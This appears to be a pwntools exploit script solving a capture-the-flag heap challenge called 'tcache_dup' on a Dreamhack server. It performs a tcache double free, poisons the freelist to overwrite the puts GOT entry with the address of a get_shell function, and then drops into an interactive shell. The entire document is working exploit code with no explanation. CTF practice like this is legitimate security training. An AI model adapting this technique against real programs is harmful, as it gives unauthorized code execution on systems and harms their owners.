from pwn import *

p = remote('host3.dreamhack.games', 22969)
#p = process(â€˜./tcache_dup')
e = ELF('./tcache_dup')
libc = ELF('libc-2.27.so')

def create(a, b):
    p.sendlineafter('> ', str(1))
    p.sendlineafter(': ', str(a))
    p.sendafter(': ', b)

def delete(a):
    p.sendlineafter('> ', str(2))
    p.sendlineafter(': ', str(a))

create(0x10, 'aaaa')
delete(0)
delete(0)

create(0x10, p64(e.got['puts']))
create(0x10, 'a'*8)
create(0x10, p64(e.sym['get_shell']))

p.interactive()
